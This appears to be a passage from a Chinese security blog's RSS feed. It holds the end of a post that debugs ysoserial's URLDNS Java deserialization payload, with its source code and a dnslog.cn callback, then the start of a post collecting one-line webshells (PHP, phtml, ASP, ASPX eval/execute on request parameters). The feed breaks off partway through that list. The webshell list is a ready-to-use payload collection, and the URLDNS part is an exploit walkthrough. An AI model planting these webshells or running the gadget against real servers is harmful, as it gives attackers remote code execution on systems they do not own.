class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                Reflections.setFieldValue(u, &lt;span class=&#34;string&#34;&gt;&amp;quot;hashCode&amp;quot;&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// During the put above, the URL&amp;#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ht;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String[] args)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                PayloadRunner.run(URLDNS.class, args);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;/**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         * &amp;lt;p&amp;gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         * using the serialized object.&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         * &amp;lt;b&amp;gt;Potential false negative:&amp;lt;/b&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         * &amp;lt;p&amp;gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         * second resolution.&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;SilentURLStreamHandler&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;URLStreamHandler&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; URLConnection &lt;span class=&#34;title&#34;&gt;openConnection&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(URL u)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; IOException &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;synchronized&lt;/span&gt; InetAddress &lt;span class=&#34;title&#34;&gt;getHostAddress&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(URL u)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;链接：&lt;a href=&#34;https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java&#34;&gt;https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;调试分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#调试分析&#34;&gt;#&lt;/a&gt; 调试分析&lt;/h1&gt;
&lt;p&gt;项目链接：&lt;a href=&#34;https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar&#34;&gt;https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;打开 idea，找到 URLDNS 入口：ysosertial-&amp;gt;src-&amp;gt;main-&amp;gt;java-&amp;gt;ysoserial-&amp;gt;payloads-&amp;gt;URLDNS.java-&amp;gt;main ()&lt;/p&gt;
&lt;h2 id=&#34;运行尝试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#运行尝试&#34;&gt;#&lt;/a&gt; 运行尝试&lt;/h2&gt;
&lt;p&gt;直接运行 main 函数，发现默认传入的命令为 calc.exe&lt;/p&gt;
&lt;p&gt;报错：URL 初始化失败，找不到 calc.exe 协议&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后一行报错信息指向 main 函数，倒数第二行报错信息指向 PayloadRunner&lt;/p&gt;
&lt;p&gt;说明为传入参数 args 有误，应为 URL，也是我们要发送请求的地址&lt;/p&gt;
&lt;p&gt;打开 dnslog，获取到地址为：&lt;a href=&#34;http://ghtzjz.dnslog.cn&#34;&gt;ghtzjz.dnslog.cn&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;编辑传入参数，&lt;a href=&#34;http://ghtzjz.dnslog.cn&#34;&gt;http://ghtzjz.dnslog.cn&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;再次运行 main ()，payload 为我们传入的参数&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;刷新 dnslog 的请求记录，发现接收到了请求，利用成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;代码调试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码调试&#34;&gt;#&lt;/a&gt; 代码调试&lt;/h2&gt;
&lt;p&gt;我们从 main 函数一步一步调试，会发现 URLDNS 在 main 中调用 PayloadRunner#run ()&lt;/p&gt;
&lt;p&gt;然后 PayloadRunner#run () 中调用 URLDNS#getObject ()&lt;/p&gt;
&lt;p&gt;URLDNS#getObject () 中的 HashMap &lt;strong&gt;ht&lt;/strong&gt; 就是我们要生成的（未序列化）payload&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;13.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;getObeject 方法中，创建了一个 URL 对象（存储我们输入的 dns 地址）–&amp;gt; 再将 URL 对象放入 HashMap 中&lt;/p&gt;
&lt;p&gt;下面一行的注释写道，在上面的 put 过程中，计算并缓存了 URL 的 hashCode; 这将重置它，以便下次调用 hashCode 时将触发 DNS 查找&lt;/p&gt;
&lt;p&gt;那么在 ht.put 时，我们进入 HashMap 查看，发现 key 进行了 hash 计算&lt;/p&gt;
&lt;p&gt;（这里插播一条小道消息，点击这个调试可以返回上一步&lt;img src=&#34;14.png&#34; style=&#34;zoom:90%;&#34; /&gt;)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;15.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;在这里就是我们的 URL 对象进行了 hash 计算&lt;/p&gt;
&lt;p&gt;hash 计算前的 URL 对象：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;16.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;hash 计算后的对象（就是对象中的 hashCode 变量发生了变化嘛）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;19.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入下一行代码，Reflections.setFieldValue 是什么呢？&lt;/p&gt;
&lt;p&gt;看名字就是一个通过反射设置成员变量值的功能😀&lt;/p&gt;
&lt;p&gt;进入函数内部，是要设置传入对象的成员变量 hashCode 的值&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;17.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看变量值，传入对象是包含 payload 的 URL 对象，要将它的 hashCode 值设置为 - 1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;18.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;执行完这行代码，发现变量 u 和 ht 中存储的 URL 对象的 hashCode 值都变为 - 1 了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;20.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后返回 ht，也就是更改过存储 key 的 hashCode 值的 HashMap&lt;/p&gt;
&lt;p&gt;再次进入 PalodRunner#run，返回的 HashMap 赋值给 objBefore，再将其序列化赋值给 ser&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;21.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Utils.releasePayload (payload, objBefore) 应该是释放资源的代码（不用在意，和最后返回值无关）&lt;/p&gt;
&lt;p&gt;最后返回 ser，即将 ser 值赋给变量 serialized，所以 serialized 就是序列化后的 payload&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;终于！开始反序列化触发漏洞了！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;从这里进入反序列化函数&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;22.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;代码注释中说明，&lt;strong&gt;利用链从 HashMap#readObject () 进入，直到进入 URL#hashCode () 触发 DNS 请求&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Gadget Chain:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;pre&gt;&lt;code&gt;HashMap.readObject()
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;pre&gt;&lt;code&gt;HashMap.putVal()
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;pre&gt;&lt;code&gt;HashMap.hash()
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;pre&gt;&lt;code&gt;URL.hashCode()
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;那我们就一直点点点直接看见 readObject&lt;/p&gt;
&lt;p&gt;好了过了没看见嘤嘤嘤&lt;/p&gt;
&lt;p&gt;直接去 Hash#readObject 处下个断点&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;23.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;往下翻翻就会看见一段代码，又看见了熟悉的单词，hash&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;24.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;根据利用链我们可知触发漏洞的 hashCode () 就在 hash () 中，我们进入该函数&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;25.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;到达 URL#hashCode，果然其中有 key.hashCode ()&lt;/p&gt;
&lt;p&gt;因为我们在构造 payload 时将 hashCode 赋值为 - 1，所以不会进入 if 而是执行下面的代码&lt;/p&gt;
&lt;p&gt;调用 URLStreamHandler#hashCode&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;26.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入 URLStreamHandler#hashCode&lt;/p&gt;
&lt;p&gt;根据 p 神的文章所言，getHostAddress 中有一行代码&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;InetAddress.getByName(host) ;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;其作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次 DNS 查询，整个触发过程就已经完成啦&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;27.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;28.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;后面继续跟进就是地址的具体查询过程了，无了无了&lt;/p&gt;
&lt;p&gt;下图是漏洞触发的调用栈&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;29.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;payload 构造&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将我们输入的 dns 地址存储在 URL 对象中 -&amp;gt; 将 URL 对象作为 key 存储在 HashMap 中 -&amp;gt; 由于作为 key 值，在 put 时会进行 hash 计算，那我们就通过反射更改其 hashCode 值为 - 1&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞触发&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;反序列化 HashMap 时，会调用 hash () 计算 key 的 hash 值 -&amp;gt; 计算时，调用 (URL 对象) key#hashCode () -&amp;gt; 由于我们将该对象的 hashCode 值设置为 - 1，所以会调用 handler.hashCode () -&amp;gt; 其中获取地址的代码， &lt;code&gt; InetAddress addr = getHostAddress(u);&lt;/code&gt;  实际上就是一次 DNS 查询&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;小彩蛋&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在构造 payload，ht.put () 时，由于 URL 的 hashCode 值为 - 1，所以同样会调用 handler.hashCode () 触发 DNS 查询，可是为什么我们只能获取到一条 dns 查询记录，而不是两条呢？&lt;/p&gt;
&lt;p&gt;直接在 DNS 查询处下断点&lt;/p&gt;
&lt;p&gt;生成 payload 时，进入 URLStreamHandler#hashCode 查看当前变量&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;31.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;反序列化时，进入 URLStreamHandler#hashCode 查看当前变量&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;32.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以发现获取到的 addr 有值了，为 &lt;code&gt;域名/127.0.0.1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;那么同样是将 &lt;code&gt;http://ysmzza.dnslog.cn&lt;/code&gt;  传入 &lt;code&gt;getHostAddress(u)&lt;/code&gt;  得到的结果却不一样呢？&lt;/p&gt;
&lt;p&gt;那么我们再进入 &lt;code&gt;getHostAddress(u)&lt;/code&gt;  进行对比&lt;/p&gt;
&lt;p&gt;构造 payload 进入 &lt;code&gt;getHostAddress(u)&lt;/code&gt;  时，如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;33.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;34.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里调用的 SilentURLStreamHandler#getHostAddress 直接返回的 null&lt;/p&gt;
&lt;p&gt;注释:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这个 URLStreamHandler 实例用于在创建 URL 实例时避免任何 DNS 解析。 DNS 解析用于漏洞检测。重要的是不要在使用序列化对象之前探测给定的 URL。潜在的误报：如果首先从测试计算机解析 DNS 名称，则目标服务器可能会获得缓存击中第二个决议。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;而在我们反序列化后进入 &lt;code&gt;getHostAddress(u)&lt;/code&gt; ，URL 对象中的 handler 就是默认的 handler 了，因而会触发 DNS 查询&lt;/p&gt;
&lt;p&gt;所以 POC 中定义 URLStreamHandler 内部类，避免生成 paayload 时进行 DNS 解析（其实看注释就能看到，但我一开没有看到这里的代码 (๑・́ωก̀๑)  ）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;小问题&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;漏洞是通过 URLStreamHandler#hashCode 触发的，那么这个 handler 是啥玩意？&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;new URL 对象时，一定要传入 handler 才能触发漏洞吗？如果不传入 handler，程序还能正常运行吗？（因为 HashMap#put 时会调用 URLStreamHandler#hashCode）会有默认的 handler 给我们调用吗？&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;查查 API&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;抽象类 &lt;code&gt; URLStreamHandler&lt;/code&gt;  是所有流协议处理程序的通用类，流协议处理程序知道如何为特定协议类型建立连接，如 &lt;code&gt;http&lt;/code&gt;  或 &lt;code&gt;https&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;在大多数情况下，  &lt;code&gt;URLStreamHandler&lt;/code&gt;  子类的实例不是由应用程序直接创建的。  更确切地说，在第一时间构建时的协议名称遇到 &lt;code&gt;URL&lt;/code&gt;  ，适当的流协议处理程序被自动加载。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以流协议程序用于为协议建立连接，并构建时的协议名称遇见 URL 时，适当的流协议处理程序被自动加载&lt;/p&gt;
&lt;p&gt;所以其实不传入 handler，URL 对象也会自动加载 handler&lt;/p&gt;
&lt;p&gt;由小彩蛋的内容可知传入自定义的 handler 只是为了在生成 payload 时不进行 dns 解析&lt;/p&gt;
&lt;h2 id=&#34;调试遇到的问题未解决&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#调试遇到的问题未解决&#34;&gt;#&lt;/a&gt; 调试遇到的问题（未解决）&lt;/h2&gt;
&lt;p&gt;在尝试代码调试时，发现无法启用 debug&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;7.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;看第一行，运行的是 jdk8_32，而我的 idea 是 64 位的，估计是不一致导致的问题（以前经常碰见 tomcat 和 jdk 不一致导致的问题）&lt;/p&gt;
&lt;p&gt;在上方菜单栏 file-&amp;gt;project structure 中可以设置 jdk 版本，更改为 64 位 jdk&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;8.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后就会报错，程序包 sun.rmi.server 不存在&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;9.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是在使用 jdk8 运行程序时并没有该错误，ctrl+click 点击进入报错程序包，是可以找到在 java 原生库中的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;10.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;也就是说在编译程序的 classpath 中没有包含’sun.rmi.server’这个包&lt;/p&gt;
&lt;p&gt;我的直觉告诉我是版本的问题，可是上图中 jdk11 的包里面也有这个包的并且已经引入项目中了&lt;/p&gt;
&lt;p&gt;所以我换回 jdk8_32，查看 jar 包的区别&lt;/p&gt;
&lt;p&gt;jdk8：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;11.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;jdk11:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;12.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;难道这个世界有些东西我真的，难以探寻吗，这真的就是我的极限了吗，不，我要去百度！！百度救我！！！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://xy2401.com/local-docs/oracle/java.zh/11/migrate/#JSMIG-GUID-D7936F0D-08A9-411E-AD2F-E14A38DA56A7&#34;&gt;这里发现&lt;/a&gt;，jdk11 不再提供 corba 工具，rmic (RMI 编辑器) 不再支持 - idl 或 - iiop 选项。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;可是 java11 的 api 里面是有 rmi 的🙁&lt;/p&gt;
&lt;p&gt;果然换成 jdk8_64 所有问题迎刃而解，那么这个问题…&lt;/p&gt;
&lt;p&gt;当然不能算解决了，未完待续！&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2021/08/12/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/</guid>
            <title>一句话木马整理</title>
            <link>http://example.com/2021/08/12/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/</link>
            <category>木马,汇总</category>
            <pubDate>Thu, 12 Aug 2021 10:53:49 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;日常系列&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#日常系列&#34;&gt;#&lt;/a&gt; 日常系列&lt;/h1&gt;
&lt;h2 id=&#34;phtml&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phtml&#34;&gt;#&lt;/a&gt; phtml&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;eval($_POST[&amp;#x27;milkii0&amp;#x27;]);&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;php&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php&#34;&gt;#&lt;/a&gt; php&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; @&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;milkii0&amp;#x27;&lt;/span&gt;]); &lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; assert(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;milkii0&amp;#x27;&lt;/span&gt;]);&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;O&amp;gt;h=@&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;milkii0&amp;#x27;&lt;/span&gt;]);&amp;lt;/O&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;asp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#asp&#34;&gt;#&lt;/a&gt; asp&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%execute(request(&amp;quot;milkii0&amp;quot;))%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%execute request(&amp;quot;milkii0&amp;quot;)%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%eval request(&amp;quot;milkii0&amp;quot;)%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;aspx&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#aspx&#34;&gt;#&lt;/a&gt; aspx&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%@ Page Language=&amp;quot;Jscript&amp;quot; %&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%eval(Request.Item[&amp;quot;milkii0&amp;quot;]);%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span 